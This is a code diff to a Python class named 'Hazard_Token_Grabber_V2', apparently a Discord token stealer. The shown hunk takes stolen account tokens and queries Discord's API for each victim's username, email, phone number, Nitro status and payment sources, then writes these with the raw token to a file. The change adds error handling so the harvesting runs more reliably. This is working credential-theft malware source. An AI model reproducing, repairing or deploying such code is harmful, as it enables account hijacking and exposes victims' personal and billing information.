@@ -268,12 +268,16 @@ class Hazard_Token_Grabber_V2:
                                 user = j["username"] + "#" + str(j["discriminator"])
                                 email = j["email"]
                                 phone = j["phone"] if j["phone"] else "No Phone Number attached"
-
-                                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                                try:
+                                    nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                                except Exception:
+                                    pass
                                 has_nitro = False
                                 has_nitro = bool(len(nitro_data) > 0)
-
-                                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                                try:
+                                    billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                                except Exception:
+                                    pass
                                 f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
